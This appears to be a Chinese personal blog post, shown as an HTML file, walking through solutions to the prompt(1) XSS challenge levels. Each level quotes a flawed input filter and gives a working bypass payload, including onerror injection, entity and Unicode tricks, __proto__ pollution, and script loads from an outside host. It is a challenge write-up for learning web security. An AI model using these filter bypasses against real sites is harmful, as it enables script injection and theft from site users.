@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang=" ">
+<head>
+  <meta charset="utf-8" />
+<link rel="icon" href="/images/rev_sheep.png " />
+<title>almostSalted</title>
+<meta name="referrer" content="no-referrer" />
+<meta name="google-site-verification" content="_CsSd0yrTQQrdEyoybq1kZNTZbIVulPo3zdQnaqAR0Y" />
+<link rel="stylesheet" href="/css/highlight/styles/monokai.min.css" />
+  
+<link rel="stylesheet" href="/css/layout.css">
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+  
+<link rel="stylesheet" href="/css/header.css">
+
+
+<div class="topBar">
+  <img class="icon" src="/images/rev_sheep.png " />
+  <div class="menu">
+     
+    <a href="/ ">home</a>
+     
+    <a href="/archives ">archives</a>
+     
+    <a href="/categories ">categories</a>
+     
+    <a href="/aboutme ">aboutme</a>
+     
+    <a href="/diary ">diary</a>
+    
+  </div>
+</div>
+<div class="blank"></div>
+  <div class="wrapper">
+    
+<link rel="stylesheet" href="/css/post.css">
+
+
+<script src="/js/post.js"></script>
+
+
+<div id="post">
+  <aside id="navigator">
+    <ol class="anchor"><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#1-lt-gt-%E9%80%83%E9%80%B8"><span class="anchor-number">1.</span> <span class="anchor-text">1 &lt;&gt;逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#2-x3D-%E9%80%83%E9%80%B8"><span class="anchor-number">2.</span> <span class="anchor-text">2 (&#x3D;逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#3-%E6%B3%A8%E9%87%8A%E9%80%83%E9%80%B8"><span class="anchor-number">3.</span> <span class="anchor-text">3 注释逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#4-%E8%84%9A%E6%9C%AC%E7%9A%84src"><span class="anchor-number">4.</span> <span class="anchor-text">4 脚本的src</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#5-%E6%8D%A2%E8%A1%8C%E9%80%83%E9%80%B8"><span class="anchor-number">5.</span> <span class="anchor-text">5 换行逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#6-action%E8%A6%86%E7%9B%96"><span class="anchor-number">6.</span> <span class="anchor-text">6 action覆盖</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#7-x2F-x2F-%E9%80%83%E9%80%B8"><span class="anchor-number">7.</span> <span class="anchor-text">7 &#x2F;**&#x2F;逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#8-u2028"><span class="anchor-number">8.</span> <span class="anchor-text">8 \u2028</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#9-Unicode%E5%A4%A7%E5%86%99%E9%80%83%E9%80%B8"><span class="anchor-number">9.</span> <span class="anchor-text">9 Unicode大写逃逸</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#10-strip-off"><span class="anchor-number">10.</span> <span class="anchor-text">10 strip off</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#11-IN"><span class="anchor-number">11.</span> <span class="anchor-text">11 IN</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#12-%E4%B8%8B%E6%B5%81%E5%9C%B0%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="anchor-number">12.</span> <span class="anchor-text">12 下流地生成字符串</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#13-%E5%8D%91%E9%84%99%E5%9C%B0%E5%88%A9%E7%94%A8-proto"><span class="anchor-number">13.</span> <span class="anchor-text">13 卑鄙地利用_proto_</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#14"><span class="anchor-number">14.</span> <span class="anchor-text">14 ?</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#15-%E7%8B%A1%E7%8C%BE%E7%9A%84svg-lt-%E2%80%93"><span class="anchor-number">15.</span> <span class="anchor-text">15 狡猾的svg+&lt;!–</span></a></li><li class="anchor-item anchor-level-1"><a class="anchor-link" href="#%E7%AE%80%E6%98%93%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="anchor-number">16.</span> <span class="anchor-text">简易浏览器工作原理</span></a><ol class="anchor-child"><li class="anchor-item anchor-level-2"><a class="anchor-link" href="#%E7%BC%96%E7%A0%81"><span class="anchor-number">16.1.</span> <span class="anchor-text">编码</span></a><ol class="anchor-child"><li class="anchor-item anchor-level-3"><a class="anchor-link" href="#Urlencode"><span class="anchor-number">16.1.1.</span> <span class="anchor-text">Urlencode</span></a></li><li class="anchor-item anchor-level-3"><a class="anchor-link" href="#Html-entity-encode"><span class="anchor-number">16.1.2.</span> <span class="anchor-text">Html entity encode</span></a></li><li class="anchor-item anchor-level-3"><a class="anchor-link" href="#JSencode"><span class="anchor-number">16.1.3.</span> <span class="anchor-text">JSencode</span></a></li></ol></li></ol></li></ol>
+  </aside>
+  <div id="content">
+    <div id="postHead">
+      <h1>prompt(1)</h1>
+      <div class="postDate">
+        <img class="dateIcon" src="/images/clockicon.svg" />
+        --2022.5.14
+      </div>
+        
+        <div class="postCategory">
+            <a href="/categories/fun/">fun</a>
+        </div>
+         
+    </div>
+    <div id="postBody">
+      <h1 id="1-lt-gt-逃逸"><a href="#1-lt-gt-逃逸" class="headerlink" title="1 &lt;&gt;逃逸"></a>1 &lt;&gt;逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;
+    input = input.replace(stripTagsRE, &#39;&#39;);
+
+    return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;;
+&#125;       
+</code></pre>
+<p>这里用正则过滤了<strong>闭合标签</strong><code>&lt;..&gt; &lt;/..&gt;</code>.</p>
+<p>正则是绕不过的,想了很久,没想出来,遂看题解:</p>
+<p>可以不闭合标签.</p>
+<p>浏览器可以自动修复一些小错误,所以漏个闭合标签<code>&gt;</code>是无伤大雅的.</p>
+<p>payload:</p>
+<p><code>&lt;img src=&quot;fuck&quot; onerror=&quot;prompt(1);&quot;</code></p>
+<p>至于为什么用<code>img</code>,因为<code>img</code>只省略了一个闭合标签,如果是<code>script</code>的话第一个<code>&gt;</code>不能省,不然没法修复 :)</p>
+<h1 id="2-x3D-逃逸"><a href="#2-x3D-逃逸" class="headerlink" title="2 (&#x3D;逃逸"></a>2 (&#x3D;逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, &#39;&#39;);
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+&#125;
+</code></pre>
+<p>又是正则,过滤了<code>= (</code>,这下函数没法闭合了.</p>
+<p>想了很久,一开始想<code>setTimeout</code>的回调就不用闭合<code>prompt</code>了,但是<code>setTimeout</code>本身就要闭合,遂上网找答案:</p>
+<p><code>escape</code>函数里是先检查的输入,这时候还没有将字符串渲染成html节点,所以可以先用html编码绕过正则.</p>
+<p><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></p>
+<p>因为<code>svg</code>是一个标签,所以渲染节点时会对内容进行解码,得到<code>(</code>,最后就能执行啦 :)</p>
+<blockquote>
+<p>如果单单是<code>&lt;script&gt;prompt&amp;#x28 1);&lt;/script&gt;</code>就不行,因为<code>&lt;script&gt;</code>标签是由js解析器解析的,并不会解码html编码.</p>
+<p>此外,只有<strong>标签的内容和属性的值</strong>可以解码,但是<strong>标签的属性不会被解码</strong>.</p>
+</blockquote>
+<h1 id="3-注释逃逸"><a href="#3-注释逃逸" class="headerlink" title="3 注释逃逸"></a>3 注释逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    // filter potential comment end delimiters
+    input = input.replace(/-&gt;/g, &#39;_&#39;);
+
+    // comment the input to avoid script execution
+    return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;;
+&#125;
+</code></pre>
+<p>额,据说是<code>&lt;!-- --!&gt;</code>也能闭合注释.</p>
+<h1 id="4-脚本的src"><a href="#4-脚本的src" class="headerlink" title="4 脚本的src"></a>4 脚本的src</h1><pre><code class="javascript">function escape(input) &#123;
+    // make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123;
+        var script = document.createElement(&#39;script&#39;);
+        script.src = input;
+        return script.outerHTML;
+    &#125; else &#123;
+        return &#39;Invalid resource.&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>首先input会<code>decodeURIComponent()</code>,就是url解码啦,本题限制url开头必须是：</p>
+<p><code>http://prompt.ml/</code>,然后输出的是<code>outerHTML</code>.</p>
+<p>因为<code>outerHTML</code>会对输入做一些处理,比如把<code>&quot;</code>转码为<code>&amp;quot;</code>,所以就别想闭合属性了.</p>
+<p>但是前面的url可以用<code>@</code>绕过,所以最后就要构造<code>src=&quot;http://prompt.ml@localhost/fuckyou.js&quot;</code>,但是捏因为正则匹配必须要求最后面有个<code>/</code>,这是不行的.</p>
+<p>不过<code>decodeURIComponent</code>提示我们可以用url编码,并且输出的<code>outerHTML</code>不会解码,也就是说:</p>
+<p><code>http://prompt.ml%2f@...</code>在<code>decodeURIComponent</code>解码后能通过正则验证,但最后输出的<code>outerHTML</code>不会把<code>%2f</code>解码为<code>/</code>(另外这里的<code>/</code>被视作纯字符,不具有分割<code>host</code>和<code>path</code>的作用).</p>
+<p>所以<code>http://prompt.ml%2f@localhost/fuckyou.js</code>.</p>
+<h1 id="5-换行逃逸"><a href="#5-换行逃逸" class="headerlink" title="5 换行逃逸"></a>5 换行逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    // apply strict filter rules of level 0
+    // filter &quot;&gt;&quot; and event handlers
+    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);
+
+    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;
+&#125;  
+</code></pre>
+<p>过滤了<code>&gt;</code>和事件属性.</p>
+<p>首先输入里可以闭合<code>&quot;</code>,所以可以设置<code>input</code>的属性<code>type=image</code>,这样就变成了一个图片,还需要设置<code>onerror</code>,但是被过滤了.</p>
+<p>可以利用换行来绕过正则匹配,输入:</p>
+<pre><code>onerror
+=
+</code></pre>
+<p>匹配的时候因为夹了个<code>/n</code>所以可以通过,html会忽略标签里的换行,这样就能绕过了.</p>
+<h1 id="6-action覆盖"><a href="#6-action覆盖" class="headerlink" title="6 action覆盖"></a>6 action覆盖</h1><pre><code class="javascript">function escape(input) &#123;
+    // let&#39;s do a post redirection
+    try &#123;
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;
+        var segments = input.split(&#39;#&#39;);
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement(&#39;form&#39;);
+        form.action = formURL;
+        form.method = &#39;post&#39;;
+
+        for (var i in formData) &#123;
+            var input = form.appendChild(document.createElement(&#39;input&#39;));
+            input.name = i;
+            input.setAttribute(&#39;value&#39;, formData[i]);
+        &#125;
+
+        return form.outerHTML + &#39;                         \n\
+&lt;script&gt;                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write(&quot;Action forbidden.&quot;)               \n\
+&lt;/script&gt;                                                 \n\
+        &#39;;
+    &#125; catch (e) &#123;
+        return &#39;Invalid form data.&#39;;
+    &#125;
+&#125;        
+</code></pre>
+<p>过滤了<code>javscript vbscript data</code>伪协议,但是表单有一个特性,后面的<code>action</code>会覆盖前面的<code>action</code>,如果子节点中有<code>action</code>那么<code>form.action</code>就是子节点的<code>action</code>,所以payload:</p>
+<p><code>javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</code>.</p>
+<p>这样正则表达式检查的<code>document.forms[0].action</code>是<code>&lt;input action=1 /&gt;</code>,不过表单提交只和<code>&lt;form&gt;</code>标签的<code>action</code>有关.</p>
+<h1 id="7-x2F-x2F-逃逸"><a href="#7-x2F-x2F-逃逸" class="headerlink" title="7 &#x2F;**&#x2F;逃逸"></a>7 &#x2F;**&#x2F;逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split(&#39;#&#39;);
+    return segments.map(function(title) &#123;
+        // title can only contain 12 characters
+        return &#39;&lt;p class=&quot;comment&quot; title=&quot;&#39; + title.slice(0, 12) + &#39;&quot;&gt;&lt;/p&gt;&#39;;
+    &#125;).join(&#39;\n&#39;);
+&#125;        
+</code></pre>
+<p>限制长度为12,但是输入会被<code>#</code>分割,遂想到多行注释.</p>
+<p>一开始想用<code>&lt;!-- xxx --&gt;</code>,但是必须要在闭合尖括号之后,即:</p>
+<p><code>&lt;p&gt;&lt;img &lt;!----&gt;</code>不能实现注释,必须要<code>&lt;p&gt;&lt;img&gt;&lt;!-- --&gt;</code>才行,但这样就没法给属性赋值.</p>
+<p>于是想到<code>&lt;script&gt;</code>标签,可以用<code>/* */</code>注释</p>
+<p>payload:</p>
+<p><code>#&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</code></p>
+<p>转换成html是这样:</p>
+<pre><code>&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;
+&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;
+&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;
+&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;
+</code></pre>
+<h1 id="8-u2028"><a href="#8-u2028" class="headerlink" title="8 \u2028"></a>8 \u2028</h1><pre><code class="javascript">function escape(input) &#123;
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n&lt;/&quot;]/g, &#39;&#39;);
+
+    return &#39;                                \n\
+&lt;script&gt;                                    \n\
+    // console.log(&quot;&#39; + input + &#39;&quot;);        \n\
+&lt;/script&gt; &#39;;
+&#125;      
+</code></pre>
+<p>过滤了换行符还把这行注释了,没办法只能从编码上下手了.</p>
+<p>js可以识别这些编码:</p>
+<p><code>unicode - \u0028</code> </p>
+<p><code>8进制编码 - \155</code></p>
+<p><code>16进制编码 - \x3c</code></p>
+<p><code>\u0028</code>是unicode的行分隔符.</p>
+<p>payload:</p>
+<p><code>\u0028prompt(1);\u0028</code></p>
+<p>但是直接输入并不能通过,copy浏览器控制台里打印出来的结果才能通过,在控制台输入:</p>
+<p><code>&#39;&lt;-\u0028prompt(1);\u0028-&gt;&#39;</code></p>
+<p>把输出复制下就能通过了</p>
+<h1 id="9-Unicode大写逃逸"><a href="#9-Unicode大写逃逸" class="headerlink" title="9 Unicode大写逃逸"></a>9 Unicode大写逃逸</h1><pre><code class="javascript">function escape(input) &#123;
+    // filter potential start-tags
+    input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);
+    // use all-caps for heading
+    input = input.toUpperCase();
+
+    // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!
+    return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;;
+&#125;  
+</code></pre>
+<p>会把<code>&lt;script&gt;</code>这类过滤成<code>&lt;_SCRIPT&gt;</code>,虽然浏览器不在意标签大小写,但是开头的<code>_</code>要想办法去掉.</p>
+<p>想到用unicode接着<code>&lt;</code>就可以了,但是有一个问题,js是大小写敏感的,而之后输入会被转换成大写,也就是说<code>&lt;\U0061</code>不会被转换成<code>&lt;a</code>…</p>
+<p>遂google,兄弟们说有一些字符没有对应的大写,在转换的时候会被换成对应的大写英文字符(我估计是打出这个字符对应的键盘上的英文字符),遍历了一下找到了能转换成<code>S</code>的字符,<code>ſ</code>,对应的十进制为<code>383</code>,直接复制到输入里就行了,payload:</p>
+<p><code>&lt;ſcript src=&quot;http://localhost/FUCK.JS&quot;&gt;&lt;/ſcript&gt;</code></p>
+<p>url大小写不敏感,所以不用在意.</p>
+<h1 id="10-strip-off"><a href="#10-strip-off" class="headerlink" title="10 strip off"></a>10 strip off</h1><pre><code class="javascript">function escape(input) &#123;
+    // (╯°□°）╯︵ ┻━┻
+    input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);
+    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
+    input = input.replace(/&#39;/g, &#39;&#39;);
+
+    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
+    return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;;
+&#125;
+</code></pre>
+<p><code>encodeURI</code>可以用来对url编码,但是不会对 <strong>ASCII字母 数字 ~!@#$&amp;*()&#x3D;:&#x2F;,;?+’</strong> 这些编码,简单来说就是编码后还能用.</p>
+<p><code>encodeURIComponent</code>扩展了编码的范围,只有 <strong>ASCII字母 数字 ~!*()’.</strong> 不会被编码,因为<code>/ &amp;</code>这些都被编码了,所以编码后的url是不能用的.</p>
+<p>回到题目上来,因为url编码,所以只能用英文字符和数字了,标签闭合之类的就别想了.</p>
+<p><code>prompt</code>会被替换成<code>alert</code>,但是输入中的<code>&#39;</code>会被移除,所以可以</p>
+<p><code>prom&#39;pt(1)</code>,这样不会被正则匹配,然后拿掉<code>&#39;</code>就变成了<code>prompt(1)</code> :)</p>
+<h1 id="11-IN"><a href="#11-IN" class="headerlink" title="11 IN"></a>11 IN</h1><pre><code class="javascript">function escape(input) &#123;
+    // name should not contain special characters
+    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, &#39;&#39;);
+
+    // data to be parsed as JSON
+    var dataString = &#39;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#39; + memberName + &#39;.&quot;&#125;&#39;;
+
+    // directly &quot;parse&quot; data in script context
+    return &#39;                                \n\
+&lt;script&gt;                                    \n\
+    var data = &#39; + dataString + &#39;;          \n\
+    if (data.action === &quot;login&quot;)            \n\
+        document.write(data.message)        \n\
+&lt;/script&gt; &#39;;
+&#125;    
+</code></pre>
+<p>过滤了很多特殊字符,但是还可以用<code>&quot;</code>闭合字符串.</p>
+<p>js有一个特殊的运算符<code>in</code>,<code>a in b</code>,用来判断属性<code>a</code>是否是对象<code>b</code>的属性或者在<code>b</code>的原型链中.</p>
+<p>字符串也是对象,所以可以用<code>in</code>.</p>
+<p><code>(prompt(1))in&quot;abc&quot;</code>,虽然看起来很怪,但是在控制台尝试是可以调用<code>prompt</code>的,所以payload:</p>
+<p><code>&quot;(prompt(1))in&quot;</code></p>
+<p>实际上会把<code>prompt(1)</code>的返回值当作属性名,然后在字符串中查找.</p>
+<h1 id="12-下流地生成字符串"><a href="#12-下流地生成字符串" class="headerlink" title="12 下流地生成字符串"></a>12 下流地生成字符串</h1><pre><code class="javascript">function escape(input) &#123;
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/&#39;/g, &#39;&#39;);
+    // table flips you!
+    input = input.replace(/prompt/g, &#39;alert&#39;);
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;;
+&#125;        
+</code></pre>
+<p><code>URIComponent</code>不会过滤<code>. ()</code>,但我一开始以为也不会过滤<code>,</code>,所以想用<code>eval(String.fromCharCode(112,114,111,109,112,116,40,41))</code>,结果发现<code>,</code>变成了<code>%2C</code>…</p>
+<p>但其实也不是不行,可以用<code>concat</code>连接字符串:</p>
+<pre><code class="javascript">eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116).concat(String.fromCharCode(40).concat(String.fromCharCode(49).concat(String.fromCharCode(41))))))))))
+</code></pre>
+<p>就是长得丑了点(原谅我不换行,不是我懒,是因为换行符也会被转码…).</p>
+</br>
+
+<blockquote>
+<p><code>parseInt(str,radix)</code></p>
+<p>可以将字符串转换成10进制整数,<code>radix</code>是该字符串的进制,例如16,那么字符串就可以用<code>A-F</code>表示<code>10-15</code></p>
+<p>所以如果用32进制,那么就可以将任意字符串转换成整数了.</p>
+</blockquote>
+<p>还有一种思路是用<code>int</code>的<code>toString</code>转换成字符串,首先用<code>parseInt</code>生成<code>prompt</code>的32进制数:</p>
+<p><code>parseInt(&#39;prompt&#39;,32)</code>,结果是<code>867982141</code>,反过来转换成字符串的方式是<code>(867982141).toString(32)</code>,括号不能丢哦.</p>
+<p>payload:</p>
+<p><code>eval((867982141).toString())(1)</code></p>
+<p>不知道为啥函数的参数还能放在eval括号外面,不过能通过…</p>
+<h1 id="13-卑鄙地利用-proto"><a href="#13-卑鄙地利用-proto" class="headerlink" title="13 卑鄙地利用_proto_"></a>13 卑鄙地利用_<em>proto</em>_</h1><pre><code class="javascript"> function escape(input) &#123;
+    // extend method from Underscore library
+    // _.extend(destination, *sources) 
+    function extend(obj) &#123;
+        var source, prop;
+        for (var i = 1, length = arguments.length; i &lt; length; i++) &#123;
+            source = arguments[i];
+            for (prop in source) &#123;
+                obj[prop] = source[prop];
+            &#125;
+        &#125;
+        return obj;
+    &#125;
+    // a simple picture plugin
+    try &#123;
+        // pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;
+        var data = JSON.parse(input);
+        var config = extend(&#123;
+            // default image source
+            source: &#39;http://placehold.it/350x150&#39;
+        &#125;, JSON.parse(input));
+        // forbit invalid image source
+        if (/[^\w:\/.]/.test(config.source)) &#123;
+            delete config.source;
+        &#125;
+        // purify the source by stripping off &quot;
+        var source = config.source.replace(/&quot;/g, &#39;&#39;);
+        // insert the content using mustache-ish template
+        return &#39;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#39;.replace(&#39;&#123;&#123;source&#125;&#125;&#39;, source);
+    &#125; catch (e) &#123;
+        return &#39;Invalid image data.&#39;;
+    &#125;
+&#125;        
+</code></pre>
+<p>首先分析一下代码,意思是让我们输入一个JSON对象然后会被解析,然后对象中的所有属性会被放到<code>config</code>对象中.</p>
+<p>之后判断一下<code>source</code>属性的<code>url</code>是否合法,如果不规范就删除<code>source</code>属性,最后输出一个<code>&lt;img&gt;</code>标签,用<code>source</code>的值替换<code>&#123;&#123;source&#125;&#125;</code>.</p>
+<p>对了在替换<code>&#123;&#123;source&#125;&#125;</code>之前还会剔除掉所有的<code>&quot;</code>字符.</p>
+<p>真的很卑鄙啊———————–</p>
+<p>本题会删除<code>source</code>属性,那么可以利用js的原型链,这样在删除之后还有一个<code>source</code></p>
+<p>简单解释一下原型属性<code>__proto__</code>,js中的所有元素其实都是对象,<code>class</code>也只是语法糖并没有对应的实现,传统对象中的继承在js中的实现为原型链.任何一个对象都有一个私有属性<code>__proto__</code>指向其构造函数的原型对象<code>prototype</code>,原型对象也有一个<code>__proto__</code>,这样层层向上直到原型对象为null.</p>
+<p><code>prototype</code>存储着<strong>抽象意义上</strong>的可被<strong>继承</strong>的属性,看一下String的:</p>
+<pre><code class="javascript">String &#123;&#39;&#39;, constructor: ƒ, anchor: ƒ, big: ƒ, blink: ƒ, …&#125;
+anchor: ƒ anchor()
+at: ƒ at()
+big: ƒ big()
+blink: ƒ blink()
+bold: ƒ bold()
+charAt: ƒ charAt()
+charCodeAt: ƒ charCodeAt()
+codePointAt: ƒ codePointAt()
+concat: ƒ concat()
+constructor: ƒ String()
+endsWith: ƒ endsWith()
+fixed: ƒ fixed()
+fontcolor: ƒ fontcolor()
+fontsize: ƒ fontsize()
+includes: ƒ includes()
+indexOf: ƒ indexOf()
+italics: ƒ italics()
+lastIndexOf: ƒ lastIndexOf()
+length: 0
+</code></pre>
+<p><code>var a=&quot;cnm&quot;</code>,那么<code>a.__proto__</code>就会指向<code>String.prototype</code>,当一个属性在<code>a</code>中找不到的时候,就会到<code>__proto__</code>里去找,举个例子:</p>
+<p><img src="https://gitee.com/salt3dfish/images/raw/master/hexo/22-05-26/9f33fdf114af4a0dd4f2b96d0c1d843d.png" alt="image-20220526182303619"></p>
+<p>所以说,一个初步的payload是:</p>
+<pre><code class="javascript">&#123;&quot;source&quot;:&quot;--&quot;,
+&quot;__proto__&quot;:&#123;
+    &quot;source&quot;:&quot;\&quot; onerror=&#39;prompt(1)&#39;&gt;&quot;
+&#125;&#125;
+</code></pre>
+<p>但是有一个问题,<code>&quot;</code>会被正则过滤掉,注意到替换<code>&#123;&#123;source&#125;&#125;</code>的是<code>replace</code>函数,那么可以利用replace支持的特殊变量 $` - 表示匹配文本的左侧的文本,而<code>&#123;&#123;source&#125;&#125;</code>前面刚好有一个双引号可以用来闭合,所以最后payload:</p>
+<pre><code class="javascript">&#123;&quot;source&quot;:&quot;--&quot;,
+&quot;__proto__&quot;:&#123;
+    &quot;source&quot;:&quot;$` onerror=&#39;prompt(1)&#39;&gt;&quot;
+&#125;&#125;
+</code></pre>
+<p>构造出来的<code>img</code>标签长这样:</p>
+<p><code>&lt;img src=&quot;&lt;img src=&quot; onerror=&#39;prompt(1)&#39; &gt;&quot;&gt;</code></p>
+<h1 id="14"><a href="#14" class="headerlink" title="14 ?"></a>14 ?</h1><pre><code class="javascript">function escape(input) &#123;
+    // I expect this one will have other solutions, so be creative :)
+    // mspaint makes all file names in all-caps :(
+    // too lazy to convert them back in lower case
+    // sample input: prompt.jpg =&gt; PROMPT.JPG
+    input = input.toUpperCase();
+    // only allows images loaded from own host or data URI scheme
+    input = input.replace(/\/\/|\w+:/g, &#39;data:&#39;);
+    // miscellaneous filtering
+    input = input.replace(/[\\&amp;+%\s]|vbs/gi, &#39;_&#39;);
+
+    return &#39;&lt;img src=&quot;&#39; + input + &#39;&quot;&gt;&#39;;
+&#125;
+</code></pre>
+<p>会被强制大写,要想到一种偷偷塞入小写字母的方法,或者干脆不用小写.</p>
+<p>因为<code>\ %</code>也会被转码,所以不能用<code>unicode</code>之类的编码了,小写看来是别指望了.</p>
+<p>其实题目提示了要用<code>data</code>协议,但是base64也是大小写敏感的啊,我看了官方题解是构造了一个比较巧妙的base64串:</p>
+<pre><code>&quot;&gt;&lt;IFRAME/SRC=&quot;x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
+
+ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
+转码后是这样的:
+  &lt;SCRIPT /
+SRC	 =HTTPS:PMT1.ML&gt;	&lt;/SCRIPT	&lt;&gt;
+</code></pre>
+<p>不过很可惜啊,我并没有一个叫做<code>PMT1.ML</code>的域名…</p>
+<p>官方题解也不行,不想做了.</p>
+<h1 id="15-狡猾的svg-lt-–"><a href="#15-狡猾的svg-lt-–" class="headerlink" title="15 狡猾的svg+&lt;!–"></a>15 狡猾的svg+&lt;!–</h1><pre><code class="javascript">function escape(input) &#123;
+    // sort of spoiler of level 7
+    input = input.replace(/\*/g, &#39;&#39;);
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split(&#39;#&#39;);
+
+    return segments.map(function(title, index) &#123;
+        // title can only contain 15 characters
+        return &#39;&lt;p class=&quot;comment&quot; title=&quot;&#39; + title.slice(0, 15) + &#39;&quot; data-comment=\&#39;&#123;&quot;id&quot;:&#39; + index + &#39;&#125;\&#39;&gt;&lt;/p&gt;&#39;;
+    &#125;).join(&#39;\n&#39;);
+&#125;
+</code></pre>
+<p>类似第七题,不过正则会过滤<code>*</code>所以不能用<code>/**/</code>注释多行.</p>
+<p>有一个小窍门:</p>
+<p>在<code>&lt;svg&gt;</code>标签内部的<code>&lt;script&gt;</code>标签可以用<code>&lt;!-- --&gt;</code>注释.</p>
+<p>payload:</p>
+<p><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</code></p>
+<p>还有一种比较时髦的解法:</p>
+<p>模板字符串,`${func()}` 可以执行函数</p>
+<p>payload:</p>
+<pre><code class="javascript">&quot;&gt;&lt;script&gt;`#$&#123;prompt(1)&#125;#`&lt;/script&gt;
+</code></pre>
+<h1 id="简易浏览器工作原理"><a href="#简易浏览器工作原理" class="headerlink" title="简易浏览器工作原理"></a>简易浏览器工作原理</h1><p>编码解码之类的内容涉及到浏览器将html源码解析成<code>DOM</code>树,以及js解析器,如果不了解浏览器的工作原理的话,做这些xss总会有种狗脑过载的感觉.</p>
+<p>所以我打算抽个时间了解一下浏览器的工作原理,大概在2100年左右吧~</p>
+</br>
+
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="Urlencode"><a href="#Urlencode" class="headerlink" title="Urlencode"></a>Urlencode</h3><p>为了能让网址中包含一些保留字符,比如<code>/ &amp; #</code>之类的,需要对url进行编码.</p>
+<p>在服务器处理网络请求的时候,会对网址解码,就算网址不包含编码后的保留字符(这种情况解码得到的结果不会变).</p>
+<pre><code>&lt;a href=&quot;xx.com&quot;&gt;a&lt;/a&gt;
+&lt;form action=&quot;xx.com&quot; /&gt;
+&lt;iframe src=&quot;xx.com&quot; /&gt;
+&lt;img src=&quot;xx&quot; /&gt;
+</code></pre>
+<p>比较奇怪的是如果用js伪协议<code>href=&quot;javascript: xxxx&quot;</code>,伪协议的内容也会被解码.</p>
